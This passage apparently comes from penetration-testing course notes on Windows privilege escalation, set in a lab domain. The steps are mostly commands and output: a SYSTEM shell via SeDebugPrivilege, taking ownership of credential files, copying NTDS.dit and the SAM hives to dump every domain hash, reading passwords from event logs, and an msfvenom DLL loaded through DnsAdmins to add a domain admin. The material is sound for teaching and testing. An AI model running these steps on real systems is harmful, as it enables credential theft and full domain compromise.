        kerberos :
        ssp :
        credman :

&lt;SNIP&gt; 

Authentication Id : 0 ; 23026942 (00000000:015f5cfe)
Session           : RemoteInteractive from 2
User Name         : jordan
Domain            : WINLPE-SRV01
Logon Server      : WINLPE-SRV01
Logon Time        : 3/31/2021 2:59:52 PM
SID               : S-1-5-21-3769161915-3336846931-3985975925-1000
        msv :
         [00000003] Primary
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * NTLM     : cf3a5525ee9414229e66279623ed5c58
         * SHA1     : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2
        tspkg :
        wdigest :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * Password : (null)
        kerberos :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * Password : (null)
        ssp :
        credman :

&lt;SNIP&gt;</code></pre></div><p>Â </p><p>Â </p><p><a href=#R-image-0658350cf826d7fa1ebda61a63847f0e class=lightbox-link><img alt=629451702bf2ebd574a3a56b6fbeba93.png class="lazy lightbox figure-image" loading=lazy src=../../resources/629451702bf2ebd574a3a56b6fbeba93.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-0658350cf826d7fa1ebda61a63847f0e><img alt=629451702bf2ebd574a3a56b6fbeba93.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/629451702bf2ebd574a3a56b6fbeba93.png></a></p><p>Â </p><p>Â </p><h2 id=remote-code-execution-as-system>Remote Code Execution as SYSTEM</h2><p>We can also leverage <code>SeDebugPrivilege</code> for <a href=https://decoder.cloud/2018/02/02/getting-system/ rel=external>RCE</a>. Using this technique, we can elevate our privileges to SYSTEM by launching a <a href=https://docs.microsoft.com/en-us/windows/win32/procthread/child-processes rel=external>child process</a> and using the elevated rights granted to our account via <code>SeDebugPrivilege</code> to alter normal system behavior to inherit the token of a <a href=https://docs.microsoft.com/en-us/windows/win32/procthread/processes-and-threads rel=external>parent process</a> and impersonate it. If we target a parent process running as SYSTEM (specifying the Process ID (or PID) of the target process or running program), then we can elevate our rights quickly. Let&rsquo;s see this in action.</p><p>First, transfer this <a href=https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1 rel=external>PoC script</a> over to the target system. Next we just load the script and run it with the following syntax <code>[MyProcess]::CreateProcessFromParent(&lt;system_pid>,&lt;command_to_execute>,"")</code>. Note that we must add a third blank argument <code>""</code> at the end for the PoC to work properly.</p><p>The PoC script has received an update. Please visit its GitHub repository and review its usage. <a href=https://github.com/decoder-it/psgetsystem rel=external>https://github.com/decoder-it/psgetsystem</a></p><p>First, open an elevated PowerShell console (right-click, run as admin, and type in the credentials for the <code>jordan</code> user). Next, type <code>tasklist</code> to get a listing of running processes and accompanying PIDs.</p><p>SeDebugPrivilege</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; tasklist 

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          4 K
System                           4 Services                   0        116 K
smss.exe                       340 Services                   0      1,212 K
csrss.exe                      444 Services                   0      4,696 K
wininit.exe                    548 Services                   0      5,240 K
csrss.exe                      556 Console                    1      5,972 K
winlogon.exe                   612 Console                    1     10,408 K</code></pre></div><p>Here we can target <code>winlogon.exe</code> running under PID 612, which we know runs as SYSTEM on Windows hosts.</p><p><a href=#R-image-63c1d92639f1936089615e843c0710b7 class=lightbox-link><img alt="PowerShell window running script to start cmd.exe as NT AUTHORITYYSTEM. Command prompt shows successful execution with SYSTEM privileges." class="lazy lightbox figure-image" loading=lazy src=../../resources/psgetsys_winlogon.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-63c1d92639f1936089615e843c0710b7><img alt="PowerShell window running script to start cmd.exe as NT AUTHORITYYSTEM. Command prompt shows successful execution with SYSTEM privileges." class="lazy lightbox lightbox-image" loading=lazy src=../../resources/psgetsys_winlogon.png></a></p><p>We could also use the <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-process?view=powershell-7.2" rel=external>Get-Process</a> cmdlet to grab the PID of a well-known process that runs as SYSTEM (such as LSASS) and pass the PID directly to the script, cutting down on the number of steps required.</p><p><a href=#R-image-9ec456d67d4ab4c08e52f29c0ce28458 class=lightbox-link><img alt="PowerShell script running to start cmd.exe as NT AUTHORITYYSTEM. Command prompt confirms execution with SYSTEM privileges." class="lazy lightbox figure-image" loading=lazy src=../../resources/psgetsys_lsass.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-9ec456d67d4ab4c08e52f29c0ce28458><img alt="PowerShell script running to start cmd.exe as NT AUTHORITYYSTEM. Command prompt confirms execution with SYSTEM privileges." class="lazy lightbox lightbox-image" loading=lazy src=../../resources/psgetsys_lsass.png></a></p><p>Other tools such as <a href=https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC rel=external>this one</a> exist to pop a SYSTEM shell when we have <code>SeDebugPrivilege</code>. Often we will not have RDP access to a host, so we&rsquo;ll have to modify our PoCs to either return a reverse shell to our attack host as SYSTEM or another command, such as adding an admin user. Play around with these PoCs and see what other ways you can achieve SYSTEM access, especially if you do not have a fully interactive session, such as when you achieve command injection or have a web shell or reverse shell connection as the user with <code>SeDebugPrivilege</code>. Keep these examples in mind in case you ever run into a situation where dumping LSASS does not result in any useful credentials (though we can get SYSTEM access with just the machine NTLM hash, but that&rsquo;s outside the scope of this module) and a shell or RCE as SYSTEM would be beneficial.</p><p>Â </p><p>Â </p><p>Â </p><h2 id=leveraging-the-privilege>Leveraging the Privilege</h2><h4 id=reviewing-current-user-privileges>Reviewing Current User Privileges</h4><p>Let&rsquo;s review our current user&rsquo;s privileges.</p><p>SeTakeOwnershipPrivilege</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                              State
============================= ======================================================= ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                                Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                          Disabled</code></pre></div><p>Â </p><p>Â </p><h4 id=enabling-setakeownershipprivilege>Enabling SeTakeOwnershipPrivilege</h4><p>Notice from the output that the privilege is not enabled. We can enable it using this <a href=https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1 rel=external>script</a> which is detailed in <a href=https://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/ rel=external>this</a> blog post, as well as <a href=https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77 rel=external>this</a> one which builds on the initial concept.</p><p>SeTakeOwnershipPrivilege</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Import-Module .\Enable-Privilege.ps1
PS C:\local&gt; .\EnableAllTokenPrivs.ps1
PS C:\local&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled</code></pre></div><p>Â </p><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; takeown /f &#39;C:\Department Shares\Private\IT\cred.txt&#39;
 
SUCCESS: The file (or folder): &#34;C:\Department Shares\Private\IT\cred.txt&#34; now owned by user &#34;WINLPE-SRV01\local-student&#34;.</code></pre></div><p>Â </p><p>Â </p><p>Let&rsquo;s grant our user full privileges over the target file.</p><p>SeTakeOwnershipPrivilege</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; icacls &#39;C:\Department Shares\Private\IT\cred.txt&#39; /grant local-student:F

processed file: C:\Department Shares\Private\IT\cred.txt
Successfully processed 1 files; Failed processing 0 files</code></pre></div><p>Â </p><p>Â </p><h2 id=when-to-use>When to Use?</h2><h4 id=files-of-interest>Files of Interest</h4><p>Some local files of interest may include:</p><p>SeTakeOwnershipPrivilege</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>c:\inetpub\wwwwroot\web.config
</span></span><span style=display:flex><span>%WINDIR%<span style=color:#ae81ff>\r</span>epair<span style=color:#ae81ff>\s</span>am
</span></span><span style=display:flex><span>%WINDIR%<span style=color:#ae81ff>\r</span>epair<span style=color:#ae81ff>\s</span>ystem
</span></span><span style=display:flex><span>%WINDIR%<span style=color:#ae81ff>\r</span>epair<span style=color:#ae81ff>\s</span>oftware, %WINDIR%<span style=color:#ae81ff>\r</span>epair<span style=color:#ae81ff>\s</span>ecurity
</span></span><span style=display:flex><span>%WINDIR%<span style=color:#ae81ff>\s</span>ystem32<span style=color:#ae81ff>\c</span>onfig<span style=color:#ae81ff>\S</span>ecEvent.Evt
</span></span><span style=display:flex><span>%WINDIR%<span style=color:#ae81ff>\s</span>ystem32<span style=color:#ae81ff>\c</span>onfig<span style=color:#ae81ff>\d</span>efault.sav
</span></span><span style=display:flex><span>%WINDIR%<span style=color:#ae81ff>\s</span>ystem32<span style=color:#ae81ff>\c</span>onfig<span style=color:#ae81ff>\s</span>ecurity.sav
</span></span><span style=display:flex><span>%WINDIR%<span style=color:#ae81ff>\s</span>ystem32<span style=color:#ae81ff>\c</span>onfig<span style=color:#ae81ff>\s</span>oftware.sav
</span></span><span style=display:flex><span>%WINDIR%<span style=color:#ae81ff>\s</span>ystem32<span style=color:#ae81ff>\c</span>onfig<span style=color:#ae81ff>\s</span>ystem.sav
</span></span></code></pre></div><p>Â </p><h1 id=windows-built-in-groups>Windows Built-in Groups</h1><p>Â </p><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td><a href=https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-backupoperators rel=external>Backup Operators</a></td><td><a href=https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-eventlogreaders rel=external>Event Log Readers</a></td><td><a href=https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-dnsadmins rel=external>DnsAdmins</a></td></tr><tr><td><a href=https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-hypervadministrators rel=external>Hyper-V Administrators</a></td><td><a href=https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-printoperators rel=external>Print Operators</a></td><td><a href=https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators rel=external>Server Operators</a></td></tr></tbody></table><p>Â </p><h4 id=verifying-sebackupprivilege-is-enabled>Verifying SeBackupPrivilege is Enabled</h4><p>Let&rsquo;s check if <code>SeBackupPrivilege</code> is enabled by invoking <code>whoami /priv</code> or <code>Get-SeBackupPrivilege</code> cmdlet. If the privilege is disabled, we can enable it with <code>Set-SeBackupPrivilege</code>.</p><p>Note: Based on the server&rsquo;s settings, it might be required to spawn an elevated CMD prompt to bypass UAC and have this privilege.</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</code></pre></div><p>Â </p><p>Â </p><h4 id=importing-libraries>Importing Libraries</h4><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\local&gt; Import-Module .\SeBackupPrivilegeCmdLets.dll</code></pre></div><p>Â </p><p>Â </p><h4 id=copying-a-protected-file>Copying a Protected File</h4><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Copy-FileSeBackupPrivilege &#39;C:\Confidential\2021 Contract.txt&#39; .\Contract.txt

Copied 88 bytes


PS C:\local&gt;  cat .\Contract.txt

Inlanefreight 2021 Contract

==============================

Board of Directors:</code></pre></div><p>Â </p><p>Â </p><p>Â </p><h4 id=copying-ntdsdit-locally>Copying NTDS.dit Locally</h4><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 12:57:52 AM

DISKSHADOW&gt; set verbose on
DISKSHADOW&gt; set metadata C:\Windows\Temp\meta.cab
DISKSHADOW&gt; set context clientaccessible
DISKSHADOW&gt; set context persistent
DISKSHADOW&gt; begin backup
DISKSHADOW&gt; add volume C: alias cdrive
DISKSHADOW&gt; create
DISKSHADOW&gt; expose %cdrive% E:
DISKSHADOW&gt; end backup
DISKSHADOW&gt; exit

PS C:\local&gt; dir E:


    Directory: E:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         5/6/2021   1:00 PM                Confidential
d-----        9/15/2018  12:19 AM                PerfLogs
d-r---        3/24/2021   6:20 PM                Program Files
d-----        9/15/2018   2:06 AM                Program Files (x86)
d-----         5/6/2021   1:05 PM                Tools
d-r---         5/6/2021  12:51 PM                Users
d-----        3/24/2021   6:38 PM                Windows</code></pre></div><h4 id=copying-ntdsdit-locally-1>Copying NTDS.dit Locally</h4><p>Next, we can use the <code>Copy-FileSeBackupPrivilege</code> cmdlet to bypass the ACL and copy the NTDS.dit locally.</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit

Copied 16777216 bytes</code></pre></div><p>Â </p><p>Â </p><p>Â </p><p>Â </p><h4 id=backing-up-sam-and-system-registry-hives>Backing up SAM and SYSTEM Registry Hives</h4><p>The privilege also lets us back up the SAM and SYSTEM registry hives, which we can extract local account credentials offline using a tool such as Impacket&rsquo;s <code>secretsdump.py</code></p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; reg save HKLM\SYSTEM SYSTEM.SAV

The operation completed successfully.


C:\local&gt; reg save HKLM\SAM SAM.SAV

The operation completed successfully</code></pre></div><p>Â </p><p>Â </p><p>Â </p><h4 id=extracting-credentials-from-ntdsdit>Extracting Credentials from NTDS.dit</h4><p>With the NTDS.dit extracted, we can use a tool such as <code>secretsdump.py</code> or the PowerShell <code>DSInternals</code> module to extract all Active Directory account credentials. Let&rsquo;s obtain the NTLM hash for just the <code>administrator</code> account for the domain using <code>DSInternals</code>.</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Import-Module .\DSInternals.psd1
PS C:\local&gt; $key = Get-BootKey -SystemHivePath .\SYSTEM
PS C:\local&gt; Get-ADDBAccount -DistinguishedName &#39;CN=administrator,CN=users,DC=inlanefreight,DC=local&#39; -DBPath .\ntds.dit -BootKey $key

DistinguishedName: CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
Sid: S-1-5-21-669053619-2741956077-1013132368-500
Guid: f28ab72b-9b16-4b52-9f63-ef4ea96de215
SamAccountName: Administrator
SamAccountType: User
UserPrincipalName:
PrimaryGroupId: 513
SidHistory:
Enabled: True
UserAccountControl: NormalAccount, PasswordNeverExpires
AdminCount: True
Deleted: False
LastLogonDate: 5/6/2021 5:40:30 PM
DisplayName:
GivenName:
Surname:
Description: Built-in account for administering the computer/domain
ServicePrincipalName:
SecurityDescriptor: DiscretionaryAclPresent, SystemAclPresent, DiscretionaryAclAutoInherited, SystemAclAutoInherited,
DiscretionaryAclProtected, SelfRelative
Owner: S-1-5-21-669053619-2741956077-1013132368-512
Secrets
  NTHash: cf3a5525ee9414229e66279623ed5c58
  LMHash:
  NTHashHistory:
  LMHashHistory:
  SupplementalCredentials:
    ClearText:
    NTLMStrongHash: 7790d8406b55c380f98b92bb2fdc63a7
    Kerberos:
      Credentials:
        DES_CBC_MD5
          Key: d60dfbbf20548938
      OldCredentials:
      Salt: WIN-NB4NGP3TKNKAdministrator
      Flags: 0
    KerberosNew:
      Credentials:
        AES256_CTS_HMAC_SHA1_96
          Key: 5db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43
          Iterations: 4096
        AES128_CTS_HMAC_SHA1_96
          Key: 94c300d0e47775b407f2496a5cca1a0a
          Iterations: 4096
        DES_CBC_MD5
          Key: d60dfbbf20548938
          Iterations: 4096
      OldCredentials:
      OlderCredentials:
      ServiceCredentials:
      Salt: WIN-NB4NGP3TKNKAdministrator
      DefaultIterationCount: 4096
      Flags: 0
    WDigest:
Key Credentials:
Credential Roaming
  Created:
  Modified:
  Credentials:</code></pre></div><h4 id=extracting-hashes-using-secretsdump>Extracting Hashes Using SecretsDump</h4><p>We can also use <code>SecretsDump</code> offline to extract hashes from the <code>ntds.dit</code> file obtained earlier. These can then be used for pass-the-hash to access additional resources or cracked offline using <code>Hashcat</code> to gain further access. If cracked, we can also present the client with password cracking statistics to provide them with detailed insight into overall password strength and usage within their domain and provide recommendations for improving their password policy (increasing minimum length, creating a dictionary of disallowed words, etc.).</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>[!bash!]$ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[*] Target system bootKey: 0xc0a9116f907bd37afaaa845cb87d0550
</span></span><span style=display:flex><span>[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
</span></span><span style=display:flex><span>[*] Searching for pekList, be patient
</span></span><span style=display:flex><span>[*] PEK # 0 found and decrypted: 85541c20c346e3198a3ae2c09df7f330
</span></span><span style=display:flex><span>[*] Reading and decrypting hashes from ntds.dit 
</span></span><span style=display:flex><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
</span></span><span style=display:flex><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style=display:flex><span>WINLPE-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7abf052dcef31f6305f1d4c84dfa7484:::
</span></span><span style=display:flex><span>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a05824b8c279f2eb31495a012473d129:::
</span></span><span style=display:flex><span>local-student:1103:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::
</span></span><span style=display:flex><span>svc_backup:1104:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
</span></span><span style=display:flex><span>bob:1105:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
</span></span><span style=display:flex><span>hyperv_adm:1106:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
</span></span><span style=display:flex><span>printsvc:1107:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>&lt;SNIP&gt;
</span></span></code></pre></div><hr><h2 id=robocopy>Robocopy</h2><h4 id=copying-files-with-robocopy>Copying Files with Robocopy</h4><p>The built-in utility <a href=https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy rel=external>robocopy</a> can be used to copy files in backup mode as well. Robocopy is a command-line directory replication tool. It can be used to create backup jobs and includes features such as multi-threaded copying, automatic retry, the ability to resume copying, and more. Robocopy differs from the <code>copy</code> command in that instead of just copying all files, it can check the destination directory and remove files no longer in the source directory. It can also compare files before copying to save time by not copying files that have not been changed since the last copy/backup job ran.</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; robocopy /B E:\Windows\NTDS .\ntds ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Thursday, May 6, 2021 1:11:47 PM
   Source : E:\Windows\NTDS\
     Dest : C:\Tools\ntds\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

          New Dir          1    E:\Windows\NTDS\
100%        New File              16.0 m        ntds.dit

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         1         0         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   16.00 m   16.00 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :           356962042 Bytes/sec.
   Speed :           20425.531 MegaBytes/min.
   Ended : Thursday, May 6, 2021 1:11:47 PM</code></pre></div><p>This eliminates the need for any external tools.</p><p>Â </p><p>Â </p><h1 id=event-log-readers>Event Log Readers</h1><p>Â </p><h4 id=confirming-group-membership>Confirming Group Membership</h4><p>Event Log Readers</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; net localgroup &#34;Event Log Readers&#34;

Alias name     Event Log Readers
Comment        Members of this group can read event logs from local machine

Members

-------------------------------------------------------------------------------
logger
The command completed successfully</code></pre></div><p>Â </p><p>Â </p><h4 id=searching-security-logs-using-wevtutil>Searching Security Logs Using wevtutil</h4><p>Event Log Readers</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; wevtutil qe Security /rd:true /f:text | Select-String &#34;/user&#34;

        Process Command Line:   net use T: \\fs01\backups /user:tim MyStr0ngP@ssword</code></pre></div><p>Â </p><p>Â </p><p>Â </p><h4 id=passing-credentials-to-wevtutil>Passing Credentials to wevtutil</h4><p>Event Log Readers</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr &#34;/user&#34;</code></pre></div><p>Â </p><p>Â </p><h4 id=searching-security-logs-using-get-winevent>Searching Security Logs Using Get-WinEvent</h4><p>Event Log Readers</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like &#39;*/user*&#39;} | Select-Object @{name=&#39;CommandLine&#39;;expression={ $_.Properties[8].Value }}

CommandLine
-----------
net use T: \\fs01\backups /user:tim MyStr0ngP@ssword</code></pre></div><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><h1 id=dnsadmins>DnsAdmins</h1><p>Â </p><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ msfvenom -p windows/x64/exec cmd=&#39;net group &#34;domain admins&#34; netadm /add /domain&#39; -f dll -o adduser.dll
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
</span></span><span style=display:flex><span>[-] No arch selected, selecting arch: x64 from the payload
</span></span><span style=display:flex><span>No encoder specified, outputting raw payload
</span></span><span style=display:flex><span>Payload size: 313 bytes
</span></span><span style=display:flex><span>Final size of dll file: 5120 bytes
</span></span><span style=display:flex><span>Saved as: adduser.dll
</span></span></code></pre></div><p>Â </p><h4 id=loading-dll-as-non-privileged-user>Loading DLL as Non-Privileged User</h4><p>DnsAdmins</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

DNS Server failed to reset registry property.
    Status = 5 (0x00000005)
Command failed: ERROR_ACCESS_DENIED</code></pre></div><p>As expected, attempting to execute this command as a normal user isn&rsquo;t successful. Only members of the <code>DnsAdmins</code> group are permitted to do this.</p><h4 id=loading-dll-as-member-of-dnsadmins>Loading DLL as Member of DnsAdmins</h4><p>DnsAdmins</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>C:\local&gt; Get-ADGroupMember -Identity DnsAdmins

distinguishedName : CN=netadm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
name              : netadm
objectClass       : user
objectGUID        : 1a1ac159-f364-4805-a4bb-7153051a8c14
SamAccountName    : netadm
SID               : S-1-5-21-669053619-2741956077-1013132368-1109</code></pre></div><h4 id=loading-custom-dll>Loading Custom DLL</h4><p>After confirming group membership in the <code>DnsAdmins</code> group, we can re-run the command to load a custom DLL.</p><p>DnsAdmins</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.</code></pre></div><p>Note: We must specify the full path to our custom DLL or the attack will not work properly.</p><p>Only the <code>dnscmd</code> utility can be used by members of the <code>DnsAdmins</code> group, as they do not directly have permission on the registry key.</p><p>With the registry setting containing the path of our malicious plugin configured, and our payload created, the DLL will be loaded the next time the DNS service is started. Membership in the DnsAdmins group doesn&rsquo;t give the ability to restart the DNS service, but this is conceivably something that sysadmins might permit DNS admins to do.</p><p>After restarting the DNS service (if our user has this level of access), we should be able to run our custom DLL and add a user (in our case) or get a reverse shell. If we do not have access to restart the DNS server, we will have to wait until the server or service restarts. Let&rsquo;s check our current user&rsquo;s permissions on the DNS service.</p><h4 id=finding-users-sid>Finding User&rsquo;s SID</h4><p>First, we need our user&rsquo;s SID.</p><p>DnsAdmins</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; wmic useraccount where name=&#34;netadm&#34; get sid

SID
S-1-5-21-669053619-2741956077-1013132368-1109</code></pre></div><h4 id=checking-permissions-on-dns-service>Checking Permissions on DNS Service</h4><p>Once we have the user&rsquo;s SID, we can use the <code>sc</code> command to check permissions on the service. Per this <a href=https://www.winhelponline.com/blog/view-edit-service-permissions-windows/ rel=external>article</a>, we can see that our user has <code>RPWP</code> permissions which translate to <code>SERVICE_START</code> and <code>SERVICE_STOP</code>, respectively.</p><p>DnsAdmins</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; sc.exe sdshow DNS

D:(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)</code></pre></div><p>Check out the <code>Windows Fundamentals</code> module for an explanation of SDDL syntax in Windows.</p><h4 id=stopping-the-dns-service>Stopping the DNS Service</h4><p>After confirming these permissions, we can issue the following commands to stop and start the service.</p><p>DnsAdmins</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; sc stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x1
        WAIT_HINT          : 0x7530</code></pre></div><p>The DNS service will attempt to start and run our custom DLL, but if we check the status, it will show that it failed to start correctly (more on this later).</p><h4 id=starting-the-dns-service>Starting the DNS Service</h4><p>DnsAdmins</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; sc start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 6960
